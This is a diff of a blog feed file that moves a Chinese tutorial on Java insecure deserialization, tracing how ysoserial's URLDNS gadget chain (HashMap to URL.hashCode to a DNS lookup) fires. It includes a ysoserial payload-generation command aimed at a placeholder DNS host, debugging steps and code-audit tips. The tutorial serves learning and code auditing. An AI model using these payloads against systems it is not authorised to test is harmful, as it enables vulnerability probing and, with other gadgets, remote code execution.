+<p>要构造这个 Gadget ，只需要初始化⼀个 <code>java.net.URL</code> 对象，作为 key 放在 <code>java.util.HashMap</code> 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode，才能触发到后⾯的 DNS 请求，否则不会调⽤ <code>URL -&gt; hashCode()</code> 。</p>
+<blockquote>
+<p>这里 hashCode 必须设置为 -1</p>
+</blockquote>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/hashCode-not-equal-minus-one.png" alt="hashCode-not-equal-minus-one"></p>
+<p>另外，URLDNS 为了防⽌在⽣成 Payload 的时候也执⾏了 URL 请求和 DNS 查询，所以重写了⼀ 个 <code>SilentURLStreamHandler</code> 类，但这不是必须的。</p>
+<p>URLDNS 中的注释也存在相应的说明，可在 ysoserial 项目代码 <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a> 中查看。</p>
+<h1 id="五、对反序列化的理解"><a href="#五、对反序列化的理解" class="headerlink" title="五、对反序列化的理解"></a>五、对反序列化的理解</h1><p>Java 反序列化漏洞核心就是执行被反序列化类的 <code>readObject()</code> 方法，<code>readObject()</code> 是整个利用链的起点。纵观整个反序列化的过程，最难的是利用链的构造。</p>
+<p>一个系统存在反序列化漏洞需要满足以下条件：</p>
+<ol>
+<li>需要可接收用户数据的<code>ObjectInputStream -&gt; readObject()</code></li>
+<li>存在有效利用链的 lib/jar 包（一般不太可能根据程序自身的反序列化类构造一个利用链，除非白盒测试）</li>
+</ol>
+<p>正常的反序列化类是没有危害的。只有当「被反序列化的类」重写了 <code>readObject()</code> 方法，且重写方法中存在「利用链」才属于不安全的。因为在「被反序列化的类」被反序列化时会自动执行 <code>readObject()</code> 方法，所以首先需要的是重写 <code>readObject()</code>，其次是重写的方法中存在「有效的利用链」。这里「利用链」有的是通过反射，有的是通过动态代理，有的是通过 JNDI 注入等等方法才导致最后的 RCE 。</p>
+<p>「被反序列化的类」一般都是 lib/jar 包中的类。正常情况下，普通系统的开发在正常情况下很少会重写 <code>readObject()</code> 且存在「有效的利用链」（普通的开发都是功能型开发，很少用到反序列化，由于 Json 的普及使得极少情况下才需要手写序列化的类<del>（结果Jackson和fastjson产生了大量的反序列化漏洞）</del>）。目前曝出来的大部分反序列化利用的都是 lib/jar 包中的类，这些类为了通用性就会写出一些特殊的 <code>readObject()</code> 方法，这也导致一些花式攻击手法的产生。</p>
+<h1 id="六、代码审计"><a href="#六、代码审计" class="headerlink" title="六、代码审计"></a>六、代码审计</h1><p>搞清楚 Java 反序列化，以后代码审计就着重注意 <code>ObjectInputStream -&gt; readObject()</code> 方法是否用户可控。</p>
+<p>若用户可控，就再去找 lib 目录中是否存在 ysoserial payload 中已有的 jar 包，有的话就能直接认为该处存在反序列化漏洞。或者查看 Java 版本，若低于 <code>Jdk7u21</code>也能造成 RCE。</p>
+<p>即使以上都没有，该处也算是一个风险点，说不定以后会有新的 Gadget 被发现。</p>
+<h1 id="七、附录"><a href="#七、附录" class="headerlink" title="七、附录"></a>七、附录</h1><h2 id="报错相关"><a href="#报错相关" class="headerlink" title="报错相关"></a>报错相关</h2><p>URLDNS 参数需加上相应协议，如 <code>http://</code>、<code>https://</code> ，若不加具体协议，会产生如下错误：</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-URLDNS-error.png" alt="ysoserial-URLDNS-error"></p>
+<p>亲测 ysoserial 不能在 Java 11 中使用，我的 Java 环境为 <code>java 1.8.0_221</code>。Java 1.8 还是稳～</p>
+<h2 id="IntelliJ-IDEA-会默认步过-JDK-中的方法"><a href="#IntelliJ-IDEA-会默认步过-JDK-中的方法" class="headerlink" title="IntelliJ IDEA 会默认步过 JDK 中的方法"></a>IntelliJ IDEA 会默认步过 JDK 中的方法</h2><h3 id="方法1-使用-Force-Step-Into"><a href="#方法1-使用-Force-Step-Into" class="headerlink" title="方法1  使用 Force Step Into"></a>方法1  使用 Force Step Into</h3><p>可以使用 Force Step Into 强制步进，简单粗暴。</p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/force-step-into.png" alt="force-step-into"></p>
+<h3 id="方法2-取消-Do-not-step-into-the-classes"><a href="#方法2-取消-Do-not-step-into-the-classes" class="headerlink" title="方法2  取消 Do not step into the classes"></a>方法2  取消 Do not step into the classes</h3><p>IntelliJ IDEA 默认在调试选项中关闭了对 JDK 源码的调试支持，需要在设置中取消勾选</p>
+<p>Mac 中设置路径为 <code>IntelliJ IDEA → Preferences...</code> ，快捷键 <code>⌘ Cmd + ,</code></p>
+<p>Windows 中设置路径为 <code>File → Setting</code></p>
+<p>打开设置界面后在 Build, Execution, Deployment → Debugger → Stepping → Do not step into the classes → 取消勾选 <code>java.*</code> 和 <code>javax.*</code></p>
+<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Do-step-into-the-classes.png" alt="Do-step-into-the-classes"></p>
+<p>设置之后调试时不会自动跳过 <code>java.*</code> 和 <code>javax.*</code> 类。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1843,145 +1982,6 @@
 <blockquote>
 <p><strong>代码审计关键</strong>：关注<code>th:utext</code>，<code>th:utext</code>中的内容用户可控则存在XSS。</p>
 </blockquote>
-]]></content>
-  </entry>
-  <entry>
-    <title>理解Java反序列化-ysoserial URLDNS</title>
-    <url>/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/</url>
-    <content><![CDATA[<p>目前网上绝大部分 Java 反序列化漏洞文章都以 <code>CommonsCollections</code> 这条利用链作为教程，这条利用链其实特别复杂，用 <code>CommonsCollections</code> 作为 Java 反序列化入门教程未免太过硬核。</p>
-<p>想要利用「不安全的反序列化」漏洞，就需要看被反序列化的类的 <code>readObject()</code> 是怎么写的。通常 Java 反序列化类中的 <code>readObject()</code> 方法很少会被重写，这也就是为什么「不安全的反序列化」利用链一般都只出现在通用 jar 包中。大部分反序列化的利用链较为复杂，甚至还需要多种 Java 特性来配合，比如反射、动态代理、JNDI注入等等，光了解这些特性就要花上不少时间。</p>
-<p>这里通过 URLDNS 作为利用链来学习 Java 反序列化就会简单很多。</p>
-<a id="more"></a>
-
-<h1 id="一、利用"><a href="#一、利用" class="headerlink" title="一、利用"></a>一、利用</h1><p>使用 WebGoat 不安全的反序列化题目作为复现环境。</p>
-<p><code>URLDNS</code> 是 ysoserial 工具的一个模块，作用是发起一个 DNS 请求，该模块方便在于利用广，仅靠 JDK 默认的 <code>java.util.Hashmap</code> 和 <code>java.net.URL</code> 即可完成反序列化的过程。并且利用链较短，有助于理解 Java 反序列化，利用链太长容易迷茫在利用链中的技术细节中。</p>
-<p>ysoserial 中 URLDNS 模块的使用方法如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;https:&#x2F;&#x2F;dns.example.com&quot;</span><br></pre></td></tr></table></figure>
-
-<p>Burp Deserialization Scanner Exploiting 利用如下：</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/URLDNS-exploit.png" alt="URLDNS-exploit"></p>
-<p>Burp Collaborator 得到如下返回，就这样非常简单的完成了一次反序列化的利用，利用反序列化发起了一次DNS请求。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/burp-collaborator-result.png" alt="burp-collaborator-result"></p>
-<h1 id="二、调试前准备"><a href="#二、调试前准备" class="headerlink" title="二、调试前准备"></a>二、调试前准备</h1><p>ysoserial 项目地址： <a href="https://github.com/frohoff/ysoserial/" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/</a> ，git clone 或直接下载下来导入到编译器中，我这里使用的编译器是 IntelliJ IDEA。</p>
-<p>ysoserial 项目结构如下，在 payloads 目录中可以看到 ysoserial 中所有的可利用类。</p>
-<img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-payload.png" alt="ysoserial-payload" style="zoom:40%;">
-
-<p>ysoserial 项目中存在 pom.xml 文件，表明这是一个由 maven 构建的项目。IntelliJ IDEA 会自动根据其中的配置下载依赖。</p>
-<blockquote>
-<p>POM（Project Object Model，即项目对象模型）是 Maven 工程的基本工作单元，是一个 XML 文件，包含了 Maven 用于构建项目的项目信息及各种配置信息，比如项目依赖，项目开发人员，版本，插件，组织信息、项目授权、项目的 url 等等。我们通过 POM 文件来完成对 Maven 项目的管理，构建等操作。</p>
-</blockquote>
-<p>如果 maven 依赖有问题，可以手工点击菜单里的 <code>Files - Project Structure</code>，然后配置 Libraries。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-project-structure.png" alt="ysoserial-project-structure"></p>
-<p>先输入需导入的包名，等待搜索完成，再选择相应的版本下载即可。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/download-library-from-maven-repository.png" alt="download-library-from-maven-repository"></p>
-<p>pom.xml 文件中 <code>maven-assembly-plugin</code> 就是一个用来打包项目的插件，可以把依赖、类文件什么的都打包在一起。其中存在 <code>&lt;mainClass&gt;</code>，表明 <code>ysoserial.GeneratePayload</code> 就是主类。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/maven-mainClass.png" alt="maven-mainClass"></p>
-<p>根据 pom.xml 中的 <code>&lt;mainClass&gt;</code> 找到找到 <code>GeneratePayload</code> 类，<code>main</code> 函数前有个绿色的小箭头，点击这个小箭头可选择从此 Debug（ 因为一个项目中可能存在多个 <code>main</code> 函数，所以通过这种方法快速找到运行时的主类）。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-GeneratePayload.png" alt="debug-GeneratePayload"></p>
-<p>此时就可以在我们需要的地方下断点，在 IntelliJ IDEA 中点击左侧栏即可设下断点，下图红色圆圈就是断点，调试过程中，程序运行到断点处就会停下。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/URLDNS-hashmap.png" alt="URLDNS-hashmap"></p>
-<p>如果此时直接开始调试只能在 console 中看到输出 usage 页面，ysoserial 需要添加参数来运行指定的 payloads 模块。</p>
-<p>所以需要修改默认参数。修改路径/方法如下。打开 IDEA 右上角的 <code>Edit Configurations...</code></p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Edit-Configurations.png" alt="Edit-Configurations"></p>
-<p>然后在 Program arguments 中输入参数 <code>URLDNS &quot;&lt;http://xxx.com&gt;&quot;</code></p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/set-program-arguments.png" alt="set-program-arguments"></p>
-<p>以上方法主要是调试整个程序，调试其他项目的思想大致如此。</p>
-<p><em>ysoserial 可以不用单独调试，这里主要是为了记录方法/思想，以后遇到其他项目时就知道该怎么去调试了。</em></p>
-<h1 id="三、反序列化过程调试"><a href="#三、反序列化过程调试" class="headerlink" title="三、反序列化过程调试"></a>三、反序列化过程调试</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>ysoserial 有那么多 payloads，调试整个程序是非常冗余的。ysoserial 提供了单独调试 payloads 的方法，每个 payload 的 <code>main</code> 方法中都有调用 <code>PayloadRunner</code> ，可以 Debug payload 的 <code>main</code> 函数来进行单独调试。不设置运行参数时会默认使用 <code>calc.exe</code> 作为参数来执行。</p>
-<p>并且 PayloadRunner 会完成序列化到反序列化全部过程，就是从 payload 的生成到 <code>readObject()</code> 的读取。这样无需额外找反序列化环境来测试，方便快捷～</p>
-<p>在 URLDNS 中点击 <code>main</code> 函数左侧的箭头进行 Debug</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-URLDNS-main.png" alt="debug-URLDNS-main"></p>
-<p>单独调试 payload 同样需要添加参数，但无需指定模块，仅设置 DNSlog地址<code>&quot;http://xxx.com&quot;</code> 即可</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/set-program-arguments-URLDNS.png" alt="set-program-arguments-URLDNS"></p>
-<p>URLDNS 中的 <code>getObject()</code> 方法中新建了一个 <code>HashMap</code> 类，并在 <code>HashMap</code> 中放置了一个 <code>java.net.URL</code> 类，url 是我们传入的参数。相比于其他 ysoserial 中的 payload，URLDNS 非常简单明了。</p>
-<p>从中我们可以得知 URLDNS 序列化的是 <code>HashMap</code> 类，在之后反序列化的过程中，就能明确需要追踪的是 <code>HashMap -&gt; readObject()</code></p>
-<h2 id="3-2-反序列化过程"><a href="#3-2-反序列化过程" class="headerlink" title="3.2 反序列化过程"></a>3.2 反序列化过程</h2><p>URLDNS 中 <code>main</code> 函数中用到 <code>PayloadRunner.run（URLDNS.class, args)</code></p>
-<p><code>PayloadRunner</code> 在这里不是重点，就不单独介绍。<code>PayloadRunner</code> 代码分析可参考：<a href="http://1codelife.com/2017/09/17/Java-deserial-learning1/" target="_blank" rel="noopener">http://1codelife.com/2017/09/17/Java-deserial-learning1/</a></p>
-<p><code>final Object objAfter = Deserializer.deserialize(serialized)</code> 表示调用反序列化过程，如下图断点处</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-deserialize.png" alt="debug-deserialize"></p>
-<p><code>Deserializer</code> 类的 <code>deserialize</code> 方法处调用 <code>objIn.readObject()</code>，正式进入反序列化操作</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-objectinputstream-readobject.png" alt="debug-objectinputstream-readobject"></p>
-<p>在反序列化过程前有一些概念需要理解：</p>
-<ol>
-<li>反序列化漏洞应该叫做「不安全的反序列化」漏洞，正常的反序列化是不存在危害的；</li>
-<li>反序列化类必需实现 <code>Serializable</code> 接口，并重写 <code>readObject()</code> 方法；</li>
-<li>未重写 <code>readObject()</code> 不存在「不安全的反序列化」漏洞；</li>
-<li>即使重写 <code>readObject()</code> 也不一定就存在「不安全的反序列化」漏洞，还需要看重写的内容，是否可构造「有效利用链」；</li>
-<li>序列化对象被反序列化时会调用序列化对象的<code>readObject()</code>方法。</li>
-</ol>
-<p>第 5 点可能不太好理解，就以 URLDNS 来举例，上图断点处是 <code>objIn.readObject()</code> ，<code>objIn</code>是<code>ObjectInputStream</code>对象，可以理解为执行的是 <code>ObjectInputStream.readObject()</code> 。此处 <code>readObject()</code> 的作用是读取传入的序列化对象。</p>
-<p>此时我们传入一个 <code>HashMap</code> 的序列化对象，<code>ObjectInputStream.readObjec()</code> 会读取该序列化对象，进行反序列化操作，反序列化过程中会执行序列化对象的 <code>readObject()</code> 方法，也就是执行 <code>HashMap.readObject()</code> 方法。</p>
-<blockquote>
-<p>两个 <code>readObject()</code> 都会执行，但两者的作用不同。利用链开始的 <code>readObject()</code> 是后者。</p>
-</blockquote>
-<p>想要利用「不安全的反序列化」漏洞，就需要看序列化对象的 <code>readObject()</code> 是怎么写的。通常 Java 序列化类中的 <code>readObject()</code> 方法很少会被重写，这也就是为什么「不安全的反序列化」一般都只出现在通用 jar 包中。且每一个反序列化的利用链都非常复杂，甚至还需要多种 Java 特性来配合，比如反射、动态代理、JNDI 注入等等，光了解这些特性就要花上不少时间。</p>
-<p>从 <code>ObjectInputStream.readObject()</code> 到 <code>HashMap.readObject()</code> 过程中会经过多个 <code>java.io</code> 和 <code>sun.reflect</code> 类中方法的调用 ，见下图调用栈，<strong>这是 Java 反序列化中最需要理解的一步</strong>。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/readobject-stack.png" alt="readobject-stack"></p>
-<p>从此开始反序列化利用链的分析，<code>HashMap -&gt; readObject()</code> 代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">            <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it's the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we're actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[]<span class="class">.<span class="keyword">class</span>, <span class="title">cap</span>)</span>;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>咋一看 <code>readObject()</code> 方法并不会有特别明显的异常，其实重点在最后一行 <code>putVal(hash(key), key, value, false, false)</code>的 <code>hash()</code> 方法，计算 key 的 hash 值（在这下断点会方便后续快速调试）</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-putVal.png" alt="debug-putVal"></p>
-<blockquote>
-<p>使用 IntelliJ IDEA 调试在这里会碰到问题，可能调试不会步进 hash 方法，而是直接步进 putVal 方法中，具体原因可看最下方附录。</p>
-</blockquote>
-<p>步进 <code>hash</code> 方法，看到其中调用了 key 的 <code>hashCode</code> 方法</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-hashCode.png" alt="debug-hashCode"></p>
-<p>继续步进 <code>hashCode</code>，因为 key 是一个 <code>java.net.URL</code> 对象，就会跳到<code>URL -&gt; hashCode</code> 方法</p>
-<p>可以看到这里会判断<code>hashCode != -1</code>，这也是为什么构造 payload 时会将 hashCode 赋值为 -1</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/hashCode-not-equal-minus-one.png" alt="hashCode-not-equal-minus-one"></p>
-<p>此处 <code>handler</code> 是 <code>URLStreamHandler</code> 的一个对象，由 <code>transient URLStreamHandler handler</code> 创建。继续步进 <code>hashCode</code> 方法。</p>
-<p>在 359 行看到 <code>getHostAddress</code>，步进该方法</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-getHostAddress.png" alt="debug-getHostAddress"></p>
-<p>这⾥ <code>InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其 IP 地址，在⽹络上就是⼀次 DNS 查询。</p>
-<p>其实到这⾥反序列化的调试就可以结束了，后续是具体发起 DNS 查询的步骤。</p>
-<p>我们也可再继续步进</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-InetAddress-getByName.png" alt="debug-InetAddress-getByName"></p>
-<p>中间略过几步…</p>
-<p>直接到关键步骤 <code>nameService.lookupAllHostAddr(host)</code>，正是从此处发起 DNS 查询。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-InetAddress.getAllByName.png" alt="debug-InetAddress.getAllByName"></p>
-<p>下图是从 <code>HashMap -&gt; readObject()</code> 开始到 DNS 请求执行的调用栈，这是 ysoserial payloads 中最简单的调用栈。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/debug-URLDNS-stack.png" alt="debug-URLDNS-stack"></p>
-<p>整个 URLDNS 的利用链可以简单概括成：</p>
-<ol>
-<li>HashMap -&gt; readObject()</li>
-<li>HashMap -&gt; hash()</li>
-<li>URL -&gt; hashCode()</li>
-<li>URLStreamHandler -&gt; hashCode()</li>
-<li>URLStreamHandler -&gt; getHostAddress()</li>
-<li>InetAddress -&gt; getByName()</li>
-<li>…</li>
-</ol>
-<h1 id="四、构造利用链"><a href="#四、构造利用链" class="headerlink" title="四、构造利用链"></a>四、构造利用链</h1><p>知道了反序列化的过程，就能据此构造利用链，利用链也叫做 “Gadget chains”。</p>
-<p>要构造这个 Gadget ，只需要初始化⼀个 <code>java.net.URL</code> 对象，作为 key 放在 <code>java.util.HashMap</code> 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算其 hashCode，才能触发到后⾯的 DNS 请求，否则不会调⽤ <code>URL -&gt; hashCode()</code> 。</p>
-<blockquote>
-<p>这里 hashCode 必须设置为 -1</p>
-</blockquote>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/hashCode-not-equal-minus-one.png" alt="hashCode-not-equal-minus-one"></p>
-<p>另外，URLDNS 为了防⽌在⽣成 Payload 的时候也执⾏了 URL 请求和 DNS 查询，所以重写了⼀ 个 <code>SilentURLStreamHandler</code> 类，但这不是必须的。</p>
-<p>URLDNS 中的注释也存在相应的说明，可在 ysoserial 项目代码 <a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a> 中查看。</p>
-<h1 id="五、对反序列化的理解"><a href="#五、对反序列化的理解" class="headerlink" title="五、对反序列化的理解"></a>五、对反序列化的理解</h1><p>Java 反序列化漏洞核心就是执行被反序列化类的 <code>readObject()</code> 方法，<code>readObject()</code> 是整个利用链的起点。纵观整个反序列化的过程，最难的是利用链的构造。</p>
-<p>一个系统存在反序列化漏洞需要满足以下条件：</p>
-<ol>
-<li>需要可接收用户数据的<code>ObjectInputStream -&gt; readObject()</code></li>
-<li>存在有效利用链的 lib/jar 包（一般不太可能根据程序自身的反序列化类构造一个利用链，除非白盒测试）</li>
-</ol>
-<p>正常的反序列化类是没有危害的。只有当「被反序列化的类」重写了 <code>readObject()</code> 方法，且重写方法中存在「利用链」才属于不安全的。因为在「被反序列化的类」被反序列化时会自动执行 <code>readObject()</code> 方法，所以首先需要的是重写 <code>readObject()</code>，其次是重写的方法中存在「有效的利用链」。这里「利用链」有的是通过反射，有的是通过动态代理，有的是通过 JNDI 注入等等方法才导致最后的 RCE 。</p>
-<p>「被反序列化的类」一般都是 lib/jar 包中的类。正常情况下，普通系统的开发在正常情况下很少会重写 <code>readObject()</code> 且存在「有效的利用链」（普通的开发都是功能型开发，很少用到反序列化，由于 Json 的普及使得极少情况下才需要手写序列化的类<del>（结果Jackson和fastjson产生了大量的反序列化漏洞）</del>）。目前曝出来的大部分反序列化利用的都是 lib/jar 包中的类，这些类为了通用性就会写出一些特殊的 <code>readObject()</code> 方法，这也导致一些花式攻击手法的产生。</p>
-<h1 id="六、代码审计"><a href="#六、代码审计" class="headerlink" title="六、代码审计"></a>六、代码审计</h1><p>搞清楚 Java 反序列化，以后代码审计就着重注意 <code>ObjectInputStream -&gt; readObject()</code> 方法是否用户可控。</p>
-<p>若用户可控，就再去找 lib 目录中是否存在 ysoserial payload 中已有的 jar 包，有的话就能直接认为该处存在反序列化漏洞。或者查看 Java 版本，若低于 <code>Jdk7u21</code>也能造成 RCE。</p>
-<p>即使以上都没有，该处也算是一个风险点，说不定以后会有新的 Gadget 被发现。</p>
-<h1 id="七、附录"><a href="#七、附录" class="headerlink" title="七、附录"></a>七、附录</h1><h2 id="报错相关"><a href="#报错相关" class="headerlink" title="报错相关"></a>报错相关</h2><p>URLDNS 参数需加上相应协议，如 <code>http://</code>、<code>https://</code> ，若不加具体协议，会产生如下错误：</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/ysoserial-URLDNS-error.png" alt="ysoserial-URLDNS-error"></p>
-<p>亲测 ysoserial 不能在 Java 11 中使用，我的 Java 环境为 <code>java 1.8.0_221</code>。Java 1.8 还是稳～</p>
-<h2 id="IntelliJ-IDEA-会默认步过-JDK-中的方法"><a href="#IntelliJ-IDEA-会默认步过-JDK-中的方法" class="headerlink" title="IntelliJ IDEA 会默认步过 JDK 中的方法"></a>IntelliJ IDEA 会默认步过 JDK 中的方法</h2><h3 id="方法1-使用-Force-Step-Into"><a href="#方法1-使用-Force-Step-Into" class="headerlink" title="方法1  使用 Force Step Into"></a>方法1  使用 Force Step Into</h3><p>可以使用 Force Step Into 强制步进，简单粗暴。</p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/force-step-into.png" alt="force-step-into"></p>
-<h3 id="方法2-取消-Do-not-step-into-the-classes"><a href="#方法2-取消-Do-not-step-into-the-classes" class="headerlink" title="方法2  取消 Do not step into the classes"></a>方法2  取消 Do not step into the classes</h3><p>IntelliJ IDEA 默认在调试选项中关闭了对 JDK 源码的调试支持，需要在设置中取消勾选</p>
-<p>Mac 中设置路径为 <code>IntelliJ IDEA → Preferences...</code> ，快捷键 <code>⌘ Cmd + ,</code></p>
-<p>Windows 中设置路径为 <code>File → Setting</code></p>
-<p>打开设置界面后在 Build, Execution, Deployment → Debugger → Stepping → Do not step into the classes → 取消勾选 <code>java.*</code> 和 <code>javax.*</code></p>
-<p><img src="/2019/12/06/Understand-Java-Deserialization-Ysoserial-URLDNS/Do-step-into-the-classes.png" alt="Do-step-into-the-classes"></p>
-<p>设置之后调试时不会自动跳过 <code>java.*</code> 和 <code>javax.*</code> 类。</p>
 ]]></content>
   </entry>
   <entry>
